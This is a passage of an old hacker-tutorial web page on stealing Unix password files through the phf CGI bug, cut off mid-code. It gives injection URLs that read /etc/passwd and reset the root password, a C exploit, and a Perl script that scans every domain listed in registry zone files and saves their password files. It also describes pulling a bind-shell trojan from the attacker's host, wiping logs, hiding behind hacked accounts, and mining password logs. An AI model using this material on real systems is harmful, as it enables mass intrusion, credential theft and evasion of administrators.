<HTML>
<HEAD>
<TITLE>Atomicfrog.com - Hacker Resources - Getting password files</TITLE>
</HEAD>
<BODY TEXT="#d0d0d0" LINK="#00ff00"" VLINK="#808080" BGCOLOR="#000000">	

<B><FONT SIZE=+1>Getting passwd files</FONT></B>&nbsp;
<BR>
<BR>Topics:
<BR><A HREF="#PHF WWW PH Query">PHF WWW PH Query</A>
<BR><A HREF="#New QG Phf Attack MO">New QG Phf Attack MO</A>
<BR><A HREF="#Newbe's">Newbe's</A>
<BR><A HREF="#Getting Shadow passwd Files">Getting Shadow passwd Files</A>
<BR><A HREF="#Getting">Getting /etc/hosts</A>
<BR>
<BR>Here are some ways to get password files from unix systems.&nbsp; Most
of them
<BR>you will need an account, but there is still a way to access to the system
<BR>without having an account.&nbsp; Here you will learn the difference between
a
<BR>regular passwd file and a shadowed passwd file.&nbsp; You will also learn
a way
<BR>to read the shadowed password file.
<BR>
<BR>
<BR><A NAME="PHF WWW PH Query"></A><B><FONT SIZE=+1>PHF WWW PH Query</FONT></B>&nbsp;
<BR>
<BR>
<BR>There is a program in the WWW cgi-bin directory called phf, if the file
<BR>is there, and has permission x, you can access it by using the www, or
<BR>a text version browser in linux called lynx.&nbsp; Now you can read files
on the
<BR>system (yup .. /etc/passwd) and save them to files local in your computer.
<BR>
<BR>There are many things we can get done here.&nbsp; If the server is running
their
<BR>httpd server as root owner, we can be root by using phf and even change
an
<BR>account password on the machine.
<BR>
<BR>I will include a perl script here that will auto check all of the systems
out
<BR>there by using the getdomain.pl script above and check what the server
is
<BR>running under.&nbsp; If it is running under root, it will just log the
id, if the
<BR>server is not running under root, it will auto get the passwd file from
the
<BR>/etc directory and name it domainname.???.passwd.
<BR>
<BR>I will also attach a script that will allow you to use a simple command
from
<BR>a shell and if phf is on the system allow you to pipe commands from the
shell
<BR>to the remote system with one command line.
<BR>
<BR>Ok now that you know what is coming, lets teach you how to use phf.
<BR>
<BR>Use your favorite web browser, or the text version in unix called most
of
<BR>the time lynx, on some systems www.
<BR>
<BR>After the screen comes up type the letter g, now a line appears like below:
<BR>
<BR>URL to open:
<BR>&nbsp; Arrow keys: Up and Down to move. Right to follow a link; Left to
go back.
<BR>&nbsp; H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history
list
<BR>
<BR>You type:
<BR>
<BR>URL to open: http://xxx.org/cgi-bin/phf/?Qalias=x%0aid
<BR>&nbsp; Arrow keys: Up and Down to move. Right to follow a link; Left to
go back.
<BR>&nbsp; H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history
list
<BR>
<BR>It returns:
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
QUERY RESULTS
<BR>
<BR>
<BR>
<BR>&nbsp;&nbsp; /usr/local/bin/ph -m alias=x id
<BR>
<BR>uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)
<BR>
<BR>
<BR>So here we see it is running under a user (nobody), so we can be a user
named
<BR>nobody on this system.&nbsp; We are not root, but this will have to do
;)
<BR>
<BR>Notice the command line:
<BR>
<BR>http://afp.org/cgi-bin/phf/?Qalias=x%0aid
<BR>
<BR>The id was the command to the server to give us the id of the user.&nbsp;
Some times
<BR>you will have to give the full path to the file you want to run, in this
case
<BR>it would have been: http://afp.org/cgi-bin/phf/?Qalias=x%0a/usr/bin/id
<BR>
<BR>Notice that after the %0a you start your command line.&nbsp; If you need
to enter
<BR>a space you would put a %20 instead of the space.&nbsp; Here would be some
sample
<BR>command lines. I will start them with %0a
<BR>
<BR>Cat the passwd file
<BR>%0a/bin/cat%20/etc/passwd
<BR>
<BR>Get a long directory of the /etc directory of all files starting with pass
<BR>%0als%20-al%20/etc/pass*
<BR>
<BR>backup the passwd file if you have root access to httpd to passwd.my
<BR>%0acp%20/etc/passwd%20/etc/passwd.my
<BR>
<BR>Change the root passwd (if the server will let you (most times it works)
<BR>%0apasswd%20root
<BR>
<BR>(the above should let you login without a password, make sure to copy the
<BR>passwd.my file over the passwd file right away, and then delete the backup,
<BR>then make yourself an suid bash shell somewhere and rename it, sniff to
get
<BR>your passwords)
<BR>
<BR>If you know how to type commands in unix and don't forget that you need
to
<BR>use %20 in the place of spaces, you will not have any problems!
<BR>
<BR>Ok lets cat the passwd file on this box ;)
<BR>
<BR>URL to open: http://xxx.org/cgi-bin/phf/?Qalias=x%0acat%20/etc/passwd
<BR>
<BR>We get:
<BR>
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
QUERY RESULTS
<BR>
<BR>
<BR>
<BR>&nbsp;&nbsp; /usr/local/bin/ph -m alias=x cat /etc/passwd
<BR>
<BR>root:R0rmc6lxVwi5I:0:0:root:/root:/bin/bash
<BR>bin:*:1:1:bin:/bin:
<BR>daemon:*:2:2:daemon:/sbin:
<BR>adm:*:3:4:adm:/var/adm:
<BR>lp:*:4:7:lp:/var/spool/lpd:
<BR>sync:*:5:0:sync:/sbin:/bin/sync
<BR>shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
<BR>halt:*:7:0:halt:/sbin:/sbin/halt
<BR>mail:*:8:12:mail:/var/spool/mail:
<BR>news:*:9:13:news:/usr/lib/news:
<BR>uucp:*:10:14:uucp:/var/spool/uucppublic:
<BR>operator:*:11:0:operator:/root:/bin/bash
<BR>games:*:12:100:games:/usr/games:
<BR>man:*:13:15:man:/usr/man:
<BR>postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
<BR>nobody:*:-2:100:nobody:/dev/null:
<BR>ftp:*:404:1::/home/ftp:/bin/bash
<BR>guest:*:405:100:guest:/dev/null:/dev/null
<BR>bhilton:LkjLiWy08xIWY:501:100:Bob Hilton:/home/bhilton:/bin/bash
<BR>web:Kn0d4HJPfRSoM:502:100:Web Master:/home/web:/bin/bash
<BR>mary:EauDLA/PT/HQg:503:100:Mary C. Hilton:/home/mary:/bin/bash
<BR>
<BR>A small passwd file &lt;g>rin
<BR>
<BR>If you want to save this to a file in your local directory, just choose
the
<BR>print option in the text browser and you will get an option to save the
file
<BR>in your home directory.
<BR>
<BR>Lets learn something here:
<BR>
<BR>mary:EauDLA/PT/HQg:503:100:Mary C. Hilton:/home/mary:/bin/bash
<BR>1&nbsp;&nbsp; :2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
:3&nbsp; :4&nbsp; :5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
:6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :7
<BR>
<BR>1=username 2=encrypted password 3=user number 4=groop id 5=real name
<BR>6=home directory 7=shell
<BR>
<BR>Ok, lets say you do not want to keep using the WWW browser, here is a script
<BR>you can compile to just type regular commands from your shell.
<BR>
<BR>phf.c
<BR>------ cut here----
<BR>
<BR>/* Some small changes for efficiency by snocrash. */
<BR>/*
<BR>&nbsp;* cgi-bin phf exploit by loxsmith [xf]
<BR>&nbsp;*
<BR>&nbsp;* I wrote this in C because not every system is going to have lynx.&nbsp;
Also,
<BR>&nbsp;* this saves the time it usually takes to remember the syntatical
format
<BR>&nbsp;* of the exploit.&nbsp; Because of the host lookup mess, this will
take
<BR>&nbsp;* approximately 12 seconds to execute with average network load.&nbsp;
Be patient.
<BR>&nbsp;*
<BR>&nbsp;*/
<BR>
<BR>#include &lt;stdio.h>
<BR>#include &lt;string.h>
<BR>#include &lt;sys/types.h>
<BR>#include &lt;sys/socket.h>
<BR>#include &lt;netinet/in.h>
<BR>#include &lt;netdb.h>
<BR>#include &lt;errno.h>
<BR>
<BR>int main(argc, argv)
<BR>&nbsp;&nbsp;&nbsp;&nbsp; int argc;
<BR>&nbsp;&nbsp;&nbsp;&nbsp; char **argv;
<BR>{
<BR>&nbsp;&nbsp;&nbsp;&nbsp; int i = 0, s, port, bytes = 128;
<BR>&nbsp;&nbsp;&nbsp;&nbsp; char exploit[0xff], buffer[128], hostname[256],
*command, j[2];
<BR>&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in sin;
<BR>&nbsp;&nbsp;&nbsp;&nbsp; struct hostent *he;
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; if (argc != 3 &amp;&amp; argc != 4) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,
"Usage: %s command hostname [port]", argv[0]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);
<BR>&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; command = (char *)malloc(strlen(argv[1]) * 2);
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; while (argv[1][i] != '\0') {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (argv[1][i] ==
32) strcat(command, "%20"); else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sprintf(j, "%c", argv[1][i]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
strcat(command, j);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ++i;
<BR>&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; strcpy(hostname, argv[2]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp; if (argc == 4) port = atoi(argv[3]); else port
= 80;
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; if (sin.sin_addr.s_addr = inet_addr(hostname)
== -1) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; he = gethostbyname(hostname);
<BR>&nbsp;&nbsp; if (he) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sin.sin_family = he->h_addrtype;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
memcpy((caddr_t) &amp;sin.sin_addr, he->h_addr_list[0],
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
he->h_length);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fprintf(stderr, "%s: unknown host %s\n", argv[0], hostname);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
exit(1);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp; sin.sin_family = AF_INET;
<BR>&nbsp;&nbsp;&nbsp;&nbsp; sin.sin_port = htons((u_short) port);
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; if ((s = socket(sin.sin_family, SOCK_STREAM, 0))
&lt; 0) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,
"%s: could not get socket\n", argv[0]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);
<BR>&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; if (connect(s, (struct sockaddr *)&amp;sin, sizeof(sin))
&lt; 0) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(s);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,
"%s: could not establish connection\n", argv[0]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);
<BR>&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp; sprintf(exploit, "GET /cgi-bin/phf/?Qalias=X%%0a%s\n",
command);
<BR>&nbsp;&nbsp;&nbsp;&nbsp; free(command);
<BR>&nbsp;&nbsp;&nbsp;&nbsp; write(s, exploit, strlen(exploit));
<BR>&nbsp;&nbsp;&nbsp;&nbsp; while(bytes == 128) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bytes = read(s,
buffer, 128);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stdout,
buffer);
<BR>&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp; close(s);
<BR>}
<BR>
<BR>-------- cut here
<BR>
<BR>Here is how you use it:
<BR>
<BR>bash% phf id xxx.org
<BR>
<BR>------
<BR>&lt;H1>Query Results&lt;/H1>
<BR>&lt;P>
<BR>/usr/local/bin/ph -m&nbsp; alias=X
<BR>id
<BR>&lt;PRE>
<BR>uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)
<BR>&lt;/GET /cgi-bin/phf/?Qalias=X%0aid
<BR>------
<BR>
<BR>The above was our response, remember to use the %codes after your command.
<BR>To cat the password file using this program you would type:
<BR>
<BR>phf cat%20/etc/passwd hostname.xxx
<BR>
<BR>Yet Another way to use phf was written by Quantumg on his web page, this
is
<BR>new and just thought of, so I was sure to add this right into this manual
<BR>for you.
<BR>
<BR>Here is the text:
<BR>
<BR>
<BR><A NAME="New QG Phf Attack MO"></A><B><FONT SIZE=+1>New QG Phf Attack MO</FONT></B>&nbsp;
<BR>
<BR>
<BR>yerp.. I know it's a long time since phf has been considered a viable
<BR>attack but you'd be surprised just how many stupid linux operators there
<BR>are out there..
<BR>
<BR>first.. a little background.
<BR>
<BR>Phf is a cgi-bin executable found on apache web servers.&nbsp; It is sploitable
<BR>and the result is you can execute commands on the web server as whoever
<BR>they're running httpd as, usually nobody but sometimes as root.&nbsp; To
sploit
<BR>it is simply a matter of connecting to the web server and giving the
<BR>query:
<BR>
<BR>&nbsp; GET /cgi-bin/phf/?Qalias=X%0a
<BR>
<BR>followed by the command you wish to execute with %20 used for spaces.&nbsp;
You
<BR>can do no piping, quotes, shell replacements, etc.
<BR>
<BR>ok.. so on with the attack.&nbsp; What we are going to do is go and look
for a
<BR>linux box (I usually telnet to the box to see the issue.net) which has
the
<BR>phf bug.&nbsp; I, like a whole lot of other people, use the program phf
<BR>loxsmith to exploit the phf bug.&nbsp; All it does is connect to the host
<BR>specified in argv[2] and dump the query with argv[1] as the command.&nbsp;
It
<BR>is used as such:
<BR>
<BR>&nbsp;phf id www.host.to.hack
<BR>
<BR>where id is the command you want to execute.&nbsp; This is the first thing
I'd
<BR>do.&nbsp; Not only does it tell me if the box is sploitable, it also tells
me
<BR>what they are running httpd as.&nbsp; So, assuming we get back a nice response,
<BR>we have a box to hack.&nbsp; The first problem is getting stuff onto the
box to
<BR>execute.&nbsp; It's not much of a problem.&nbsp; You can 1 check for writable
ftp
<BR>directory's or 2, and my personal favorite, use rcp.&nbsp; To use rcp you
need
<BR>to set up a few things on your machine (or better yet, a machine that you
<BR>hacked earlier).&nbsp; The first of these things is an account that you
can use
<BR>for the transfer.&nbsp; Select something simple and unmemoriable.&nbsp;
I use the
<BR>username "test".&nbsp; Next you need to put the name of the host you are
<BR>hacking (www.host.to.hack) in your /etc/hosts.equiv.&nbsp; Then you need
to
<BR>make sure you have a "shell" line in your /etc/inetd.conf and that you
<BR>have restarted inetd to read this line.&nbsp; Finally you need to create
a
<BR>.rhosts file in the test's homedir that has the name of the host you're
<BR>hacking followed by the username that httpd is running as.
<BR>
<BR>/etc/hosts.equiv:
<BR>www.host.to.hack
<BR>
<BR>/etc/inetd.conf:
<BR>shell&nbsp;&nbsp; stream&nbsp; tcp&nbsp;&nbsp;&nbsp;&nbsp; nowait&nbsp;
root&nbsp;&nbsp;&nbsp; /usr/sbin/tcpd&nbsp; in.rshd -L
<BR>
<BR>~test/.rhosts:
<BR>www.host.to.hack nobody
<BR>
<BR>ok.. so once you have all that set up you can get things onto the remote
<BR>host.
<BR>
<BR>What I used to do was transfer little hacks across that had been heavily
<BR>modified to work whilst being executed by phf.&nbsp; It was not a pleasant
<BR>affair, nor very effective.&nbsp; Now we have a solution.&nbsp; What we
send across
<BR>is a modified in.telnetd.&nbsp; It has been modified to start up in "debug"
<BR>mode which makes it bind to a port (9999) and execute /bin/sh instead of
<BR>/bin/login.&nbsp; It also forks before executing the shell which means
it will
<BR>sit on port 9999 and accept as many connections as you want.
<BR>
<BR>So, to get this onto the remote host, all we have to do is put it in
<BR>test's homedir (make sure it's readable) and do:
<BR>
<BR>&nbsp; phf 'rcp test@my.ip.address:bindwarez /tmp' www.host.to.hack
<BR>
<BR>in your local logs you will see a connection attempt to in.rshd and the
<BR>command it executes (something like 'rcp -f bindwarez').. after the phf
<BR>finishes bindwarez will be in the /tmp on the remote machine.&nbsp; You
can now
<BR>execute it and telnet to port 9999.
<BR>
<BR>If the web site was stupid enough to be running httpd as root you will
now
<BR>want to secure it by installing an in.telnetd trojan and cleaning up the
<BR>logs.&nbsp; However, more likely, you will only have a nobody shell and
have to
<BR>hack root with some other sploit.&nbsp; I usually find this no problem
because
<BR>the admin has taken it as granted that no-one will ever have a shell on
<BR>their www box and thus there's no need to secure it - which they're
<BR>obviously not very good at if they still have sploitable phf.
<BR>
<BR>I cant stress the importance of cleaning out the logs tho.&nbsp; Your address,
<BR>the one in the rcp command you sent, is right there for the admin to see.
<BR>They dont even have to dig.&nbsp; These logs are usually in
<BR>/usr/local/etc/httpd/logs and sometimes in /var/lib/httpd/logs.&nbsp; The
best
<BR>way to find it is to try these locations and then, if you still don't find
<BR>it, do: find / -name cgi-bin.&nbsp; That'll do it.&nbsp; Also don't forget
to kill
<BR>the bindwarez processes and remove the /tmp/bindwarez.
<BR>
<BR>This is a really kewl attack.. it solves a lot of problems which makes
phf
<BR>so annoying.
<BR>
<BR>L8s
<BR>
<BR>QuantumG
<BR>
<BR>
<BR>Another way to use phf would be to use the perl script a few scripts above
<BR>called getdomain.pl to rip host names out of the domain files on
<BR>rs.internic.net, after this is done you can 'probe' every domain on the
net
<BR>using geturl.pl.
<BR>
<BR>Here is the script:
<BR>
<BR>geturl.pl
<BR>--------- cut here
<BR>
<BR>#!/usr/bin/perl -w
<BR>#
<BR># geturl by Nfin8 / Invisible Evil
<BR># Questions to: /msg i-e&nbsp; or&nbsp; /msg i^e
<BR>#
<BR># Format of http://website.dom/cgi-bin/phf?Qalias=x%0a/usr/bin/id
<BR># Format of http://website.dom/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
<BR># IF result of first command returns an "id=" then check for user. If user
<BR># is not root then execute the 2nd form.
<BR>
<BR># Assign null list to @URLs which will be added to later.
<BR>my(@URLs)=();
<BR>my($program) = "lynx -dump";
<BR>
<BR># Pull off filename from commandline. If it isn't defined, then assign
default.
<BR>my($URLfilename) = shift;
<BR>$URLfilename = "urls" if !defined($URLfilename);
<BR>
<BR># Do checking on input.
<BR>die("GetURL: $URLfilename is a directory.\n") if (-d $URLfilename);
<BR>&nbsp;
<BR># Open and read contents of URL file into @URL by line.
<BR>open(FILE, $URLfilename) or die("GetURL: Cannot open $URLfilename for input.\n");
<BR>@URLs = &lt;FILE>;
<BR>close(FILE);
<BR>
<BR># Open output file.
<BR>open(OUTFILE, ">>GetURLResults") or die("GetURL: Cannot open output file.\n");
<BR>
<BR>my($url)="";
<BR>foreach $url (@URLs) {
<BR>&nbsp; print ("Now checking: $url");
<BR>&nbsp; chomp($url);
<BR>&nbsp; $result = `$program http://${url}/cgi-bin/phf?Qalias=x%0a/usr/bin/id`;
<BR>&nbsp; print OUTFILE ("\n============ $url ============\n");
<BR>&nbsp; foreach (split(/\n/, $result)) {
<BR>&nbsp;&nbsp;&nbsp; print OUTFILE ("$_\n");
<BR>&nbsp; }
<BR>&nbsp; if ($result =~ m/id=/i) {
<BR>&nbsp;&nbsp;&nbsp; if ($result =~ m/root/i) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print ("Logging root response.\n");
<BR>&nbsp;&nbsp;&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print ("Got ID response, getting /etc/passwd...");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $result = `$program http://${url}/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd`;
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Output results to file named &lt;domain>.passwd;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; local($domainfilename)="";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $domainfilename = $url;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (open(PASSWDFILE, ">${domainfilename}.passwd"))
{
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print PASSWDFILE ("\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (split(/\n/, $result))
{
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print PASSWDFILE
("$_\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(PASSWDFILE);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print ("Done! [$domainfilename].\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print ("FAILED! [$domainfilename].\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>}
<BR>&nbsp;
<BR># We are done. Close the output file and end the program.
<BR>close (OUTFILE);
<BR>
<BR>
<BR>0;
<BR>
<BR>------------- cut here
<BR>
<BR>Ok this is easy, if you name your domain file urls, you are all set to
go.
<BR>Just type geturl.pl after chmod +x on the file.
<BR>
<BR>Here are my doc's for the file:
<BR>
<BR>This handy tool is easy to use and will get you some root access and
<BR>many passwd files from different domains.
<BR>
<BR>geturl.pl will try and log results for every domain on the internet.&nbsp;
You
<BR>choose the type: .COM .EDU .ORG .MIL .GOV&nbsp; (OR) you can supply a list
of
<BR>IP addresses to&nbsp; be checked.&nbsp; If&nbsp; finds a root access account
it
<BR>will simply log uid=root in the result file and go on to the next domain.
<BR>If PHF Probe finds non-root access it will snag the passwd file for you
and
<BR>save it in the current directory in the (domainname.???.passwd) format.
<BR>
<BR>Here are the short doc's and how it works.&nbsp; Any questions /msg i-e
or i^e
<BR>
<BR>ftp to ftp.rs.internic.net
<BR>
<BR>in the domain directory you will find:
<BR>
<BR>com.zone.gz
<BR>edu.zone.gz
<BR>gov.zone.gz
<BR>mil.zone.gz
<BR>net.zone.gz
<BR>org.zone.gz
<BR>
<BR>download these files and run getdomain.pl on the domains you want to target
<BR>first, in this manor:&nbsp; "perl getdomain.pl com.zone com >com.all"
<BR>
<BR>What this will do is rip all of the .COM domains and put them into a file
<BR>called com.all.
<BR>
<BR>If you wanted to do all of the .EDU addresses you would type:
<BR>
<BR>perl getdomain.pl edu.zone edu >edu.all
<BR>
<BR>Now you will have a list to use with (geturl.pl) called edu.all
<BR>
<BR>To use this list just type:
<BR>
<BR>geturl.pl &lt;filename>
<BR>
<BR>filename=edu.all or com.all&nbsp; and leave out the &lt;>'s
<BR>if you name your domain file 'urls' it does not require &lt;filename>
<BR>
<BR>results will log into a file name of: GetURLResults in the current directory.
<BR>
<BR>1. geturl.pl will search using lynx (make sure it is in your path)
<BR>
<BR>2. if geturl finds it has root access to httpd on a url it will just log
<BR>&nbsp;&nbsp; root for that domain in the result file.&nbsp; If geturl finds
it is not root,
<BR>&nbsp;&nbsp; but still has access to the domain using phf it will snatch
the domain
<BR>&nbsp;&nbsp; passwd file and save it in the current directory under fulldomainname.passwd
<BR>
<BR>3. if you like you can just give a list of ip addresses in the feed file
<BR>
<BR>4. i use os/2 with lynx and perl ported to the hpfs so i have no problems
<BR>&nbsp;&nbsp; with the long file names.&nbsp; i have tested it under unix
and it works good
<BR>&nbsp;&nbsp; so you should have no problems running this in a unix shell.
<BR>
<BR>What you need:
<BR>
<BR>1. Perl in the path
<BR>2. Lynx in the path
<BR>3. 256 char filenames ie: (unix or os/2 hpfs)
<BR>4. The files included here
<BR>5. Internic's domain files from their ftp or just make your own list or
<BR>&nbsp;&nbsp; urls or IP's and name the file 'urls' and type: geturl.pl
<BR>
<BR>Caution:
<BR>
<BR>It would be best if you paid cash for an internet account in your area
under
<BR>another name or used a hacked account to get all of your results, then
used
<BR>another safe account to start your work on the results.&nbsp; BUT I don't
need to
<BR>tell you this right?&nbsp; I take no blame for these files, they are provided
for
<BR>you to use to check security on domains ;)
<BR>
<BR>
<BR>&nbsp;getdomain.pl: to rip .ORG .COM .EDU .MIL .GOV Internic domain files
<BR>&nbsp;&nbsp;&nbsp; geturl.pl: to check and log the results of each domain
<BR>GetURLResults: The file that geturl makes as its log file
<BR>
<BR>Here is one more thought:
<BR>
<BR>If you can read the /var/adm/messages file you can get some user passwords
<BR>out of there lotz of times!&nbsp; I have even got ROOT passwords from there!
<BR>
<BR>Wow many times have you been in a hurry to login?&nbsp; You type the password
<BR>at the Login:&nbsp; his is easy to do on one of those days that nothing
seems to
<BR>be going right.&nbsp; You failed the login twice, the system is running
slow, and it
<BR>just happens!
<BR>
<BR>Login: you hit enter
<BR>Password: you think this is wanting the login name so you type your name
<BR>Login: you type your password
<BR>
<BR>In the messages file it looks like this:
<BR>
<BR>Login: yourpassword
<BR>Password ****** They don't give it, only the login name, but ooops, you
<BR>typed your password, and if we have access to read the messages file,
<BR>we have a good password to put in crackerjack and run it.&nbsp; If on a
small
<BR>system, no prob ... lets hope it's root ;)
<BR>
<BR>Here is a script to make things easy!
<BR>
<BR>
<BR>FOR QUANTUM'S BINDWAREZ FILE: You will find it at the end of this paper
<BR>in the appendix uuencoded.
<BR>
<BR>------------ cut here
<BR>
<BR>#!/bin/sh
<BR># Under a lot of linux distributions(I know Redhat 3.0.3 and Slackware
3.0)
<BR># /var/log/messages is world readable. If a user types in his password
at
<BR># the login prompt, it may get logged to /var/log/messages.
<BR>#
<BR># I could swear this topic has been beaten to death, but I still see this
<BR># problem on every linux box I have access to.
<BR>#
<BR># Dave G.
<BR># 12/06/96
<BR># &lt;daveg@escape.com>
<BR># http://www.escape.com/~daveg
<BR>
<BR>echo Creating Dictionary from /var/log/messages, stored in /tmp/messages.dict.$$
<BR>
<BR>grep "LOGIN FAILURE" /var/log/messages | cut -d',' -f2 | cut -c2- | sort
| uniq >> /tmp/messages.dict.$$
<BR>
<BR>if [ ! -e ./scrack ]
<BR>then
<BR>&nbsp;&nbsp; echo "Creating scrack.c"
<BR>&nbsp;&nbsp; cat &lt;&lt; ! > scrack.c
<BR>#include &lt;stdio.h>
<BR>#include &lt;unistd.h>
<BR>#include &lt;pwd.h>
<BR>#include &lt;sys/types.h>
<BR>#define get_salt( d, s ) strncpy( d, s, 2 )
<BR>void
<BR>main(argc,argv)
<BR>int argc;
<BR>char **argv;
<BR>{
<BR>&nbsp;&nbsp; struct passwd *pwd;
<BR>&nbsp;&nbsp; FILE *fp;
<BR>&nbsp;&nbsp; char buff[80], salt[3], *encrypted_string;
<BR>
<BR>&nbsp;&nbsp; if ( ( fp = fopen( argv[1], "r" ) ) == NULL )
<BR>&nbsp;&nbsp; {
